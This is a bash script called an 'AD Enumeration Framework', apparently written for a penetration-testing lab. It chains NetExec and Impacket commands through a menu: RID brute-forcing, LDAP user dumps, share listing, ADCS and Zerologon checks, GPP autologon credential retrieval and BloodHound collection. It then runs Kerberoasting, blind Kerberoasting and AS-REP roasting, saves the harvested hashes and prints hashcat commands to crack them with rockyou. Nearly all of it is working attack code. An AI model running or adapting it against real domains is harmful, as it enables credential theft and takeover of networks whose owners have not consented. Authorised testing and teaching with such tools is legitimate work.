#!/bin/bash

# ================= COLORS =================
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
CYAN="\e[36m"
MAGENTA="\e[35m"
BOLD="\e[1m"
NC="\e[0m"

banner() {
    echo
    echo -e "${BOLD}${CYAN}=====================================================${NC}"
    echo -e "${BOLD}${CYAN} $1 ${NC}"
    echo -e "${BOLD}${CYAN}=====================================================${NC}"
    echo
}

# Matches the Purple/Magenta ">>>" style from your screenshots
sub_banner() {
    echo -e "${BOLD}${MAGENTA}>>> $1 ...${NC}"
}

success() { echo -e "${GREEN}[+] $1${NC}"; }
warn()    { echo -e "${YELLOW}[!] $1${NC}"; }
error()   { echo -e "${RED}[-] $1${NC}"; }

echo "======================================================"
echo "    RedBlue_Frank_ADenum.sh - AD Enumeration Framework"
echo "======================================================"

# ---------------- INPUTS ----------------
read -rp "$(echo -e ${YELLOW}'[?] Domain Controller FQDN (e.g. DC01.hacksmarter.local): '${NC})" DC
read -rp "$(echo -e ${YELLOW}'[?] Domain name (e.g. hacksmarter.local): '${NC})" DOMAIN

# ---------------- RESOLVE DC IP ----------------
DCIP=$(getent hosts "$DC" | awk '{print $1}' | head -n 1)
[[ -n "$DCIP" ]] && success "Resolved DC IP: $DCIP"

VALID_CREDS=false

# ---------------- CREDENTIAL LOOP ----------------
while true; do

    read -rp "$(echo -e ${YELLOW}'[?] Username (leave blank for no-creds): '${NC})" USER
    read -rp "$(echo -e ${YELLOW}'[?] Password (leave blank for no-creds): '${NC})" PASS

    echo
    success "Username entered: \"$USER\""
    success "Password entered: \"$PASS\""
    echo

    if [[ -z "$USER" && -z "$PASS" ]]; then
        warn "No credentials supplied. Continuing without creds."
        VALID_CREDS=true
        break
    fi

    echo -e "${YELLOW}[+] Validating credentials via SMB...${NC}"

    if nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --shares 2>/dev/null | grep -qi "\[+\]"; then
        success "Authentication successful"
        echo -e "${GREEN}${DOMAIN}\\${USER}:${PASS}${NC}"
        VALID_CREDS=true
        break
    else
        error "Authentication failed. Please re-enter credentials."
        echo
    fi

done

# ================= MENU LOOP =================
while true; do
if $VALID_CREDS; then

    echo
    echo "===== VALID CREDS ENUMERATION MENU ====="
    echo "1) Protocol Reachability Check"
    echo "2) Username Enumeration (RID brute + LDAP users)"
    echo "3) Enumerate SMB Shares"
    echo "4) Check for ADCS"
    echo "5) Check for pre-Windows 2000 accounts"
    echo "6) Zerologon Check"
    echo "7) GPP AutoLogon"
    echo "8) BloodHound Collection"
    echo "9) Kerberoasting"
    echo "10) Blind Kerberoasting"
    echo "11) AS-REP Roasting"
    echo "12) RUN ALL (Fully Automated, Skips Zerologon)"
    echo "0) Exit"
    echo

    read -rp "$(echo -e ${YELLOW}'[?] Select option: '${NC})" OPTION

    case $OPTION in

        1)
            sub_banner "PROTOCOL REACHABILITY CHECK"
            nxc smb "$DOMAIN"
            nxc ldap "$DOMAIN" --port 389
            nxc winrm "$DOMAIN"
            nxc rdp "$DOMAIN"
            nxc mssql "$DCIP" -u "$USER" -p "$PASS"
            ;;

        2)
            sub_banner "RID BRUTE"
            nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --rid-brute | grep 'SidTypeUser'

            sub_banner "LDAP USERS"
            nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" --users
            ;;

        3)
            sub_banner "SMB SHARE ENUMERATION"
            nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --shares
            ;;

        4)
            sub_banner "ADCS ENUMERATION"
            ADCS_OUT=$(nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M adcs)
            echo "$ADCS_OUT"

            if echo "$ADCS_OUT" | grep -q "Found PKI Enrollment Server"; then
                echo
                echo -e "${BOLD}${MAGENTA}[!!!] ADCS / CA DETECTED${NC}"
                echo -e "${BOLD}${CYAN}Refer to Certipy for further enumeration:${NC}"
                echo -e "${BOLD}${GREEN}https://github.com/ly4k/Certipy/wiki${NC}"
            fi
            ;;

        5)
            sub_banner "PRE-WINDOWS 2000 ACCOUNTS"
            nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M pre2k
            ;;

        6)
            sub_banner "ZEROLOGON CHECK"
            nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M zerologon
            ;;

        7)
            sub_banner "GPP AUTOLOGON"
            nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M gpp_autologin
            ;;

        8)
            read -rp "$(echo -e ${YELLOW}'[?] DNS Server IP: '${NC})" DNSIP
            sub_banner "BLOODHOUND COLLECTION"

            nxc ldap "$DC" --port 389 -u "$USER" -p "$PASS" \
                --bloodhound --collection All --dns-server "$DNSIP"

            ZIP=$(ls -t ~/.nxc/logs/*bloodhound.zip 2>/dev/null | head -n 1)
            [[ -f "$ZIP" ]] && cp "$ZIP" . && success "BloodHound ZIP copied: $(basename "$ZIP")"
            ;;

        9)
            sub_banner "KERBEROASTING"
            GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP" -request -outputfile Kerb_hashes.txt

            if [[ -s Kerb_hashes.txt ]]; then
                success "Kerberoast hashes saved to Kerb_hashes.txt"
                echo -e "${GREEN}hashcat -m 13100 Kerb_hashes.txt /usr/share/wordlists/rockyou.txt${NC}"
            else
                warn "No Kerberoastable SPNs found"
            fi
            ;;

        10)
            sub_banner "BLIND KERBEROASTING"

            if [[ ! -f users_auto.txt ]]; then
                warn "users_auto.txt not found – generating from LDAP"
                nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" --users \
                    | awk '/^[A-Za-z0-9]/ {print $1}' > users_auto.txt
            fi

            GetUserSPNs.py "$DOMAIN/" -usersfile users_auto.txt -dc-host "$DCIP" -no-preauth -outputfile Hash_krb5tgs

            if [[ -s Hash_krb5tgs ]]; then
                success "Blind Kerberoast hashes saved to Hash_krb5tgs"
                echo -e "${GREEN}hashcat -m 13100 Hash_krb5tgs /usr/share/wordlists/rockyou.txt${NC}"
            else
                warn "No blind Kerberoastable accounts found"
            fi
            ;;

        11)
            sub_banner "AS-REP ROASTING"

            if [[ ! -f users_auto.txt ]]; then
                warn "users_auto.txt not found – generating from LDAP"
                nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" --users \
                    | awk '/^[A-Za-z0-9]/ {print $1}' > users_auto.txt
            fi

            GetNPUsers.py "$DOMAIN/" -usersfile users_auto.txt -format hashcat -output AS_hashes.txt

            if [[ -s AS_hashes.txt ]]; then
                success "AS-REP hashes saved to AS_hashes.txt"
                echo -e "${GREEN}hashcat -m 18200 AS_hashes.txt /usr/share/wordlists/rockyou.txt${NC}"
            else
                warn "No AS-REP roastable users found"
            fi
            ;;

        12)
            banner "RUN ALL – FULLY AUTOMATED ENUMERATION"

            sub_banner "Protocol Reachability Check"
            nxc smb "$DOMAIN"
            nxc ldap "$DOMAIN" --port 389
            nxc winrm "$DOMAIN"
            nxc rdp "$DOMAIN"
            nxc mssql "$DCIP" -u "$USER" -p "$PASS"

            sub_banner "SMB Share Enumeration"
            nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --shares

            sub_banner "RID BRUTE"
            nxc smb "$DOMAIN" -u "$USER" -p "$PASS" --rid-brute | grep 'SidTypeUser'

            sub_banner "LDAP USERS"
            nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" --users \
                | tee >(awk '/^[A-Za-z0-9]/ {print $1}' > users_auto.txt)

            sub_banner "Pre-Windows 2000 Account Check"
            nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M pre2k

            sub_banner "ADCS Enumeration"
            nxc ldap "$DOMAIN" --port 389 -u "$USER" -p "$PASS" -M adcs

            sub_banner "GPP AutoLogon Check"
            nxc smb "$DOMAIN" -u "$USER" -p "$PASS" -M gpp_autologin

            sub_banner "BloodHound Collection"
            nxc ldap "$DC" --port 389 -u "$USER" -p "$PASS" \
                --bloodhound --collection All --dns-server "$DCIP"
            
            ZIP=$(ls -t ~/.nxc/logs/*bloodhound.zip 2>/dev/null | head -n 1)
            [[ -f "$ZIP" ]] && cp "$ZIP" . && success "Collected BloodHound ZIP"

            sub_banner "Kerberoasting & AS-REP Roasting"
            GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DCIP" -request -outputfile Kerb_hashes.txt
            GetUserSPNs.py "$DOMAIN/" -usersfile users_auto.txt -dc-host "$DCIP" -no-preauth -outputfile Hash_krb5tgs
            GetNPUsers.py "$DOMAIN/" -usersfile users_auto.txt -format hashcat -output AS_hashes.txt

            banner "RUN ALL COMPLETE"
            ;;

        0)
            success "Exiting enumeration framework"
            break
            ;;
    esac
fi
done
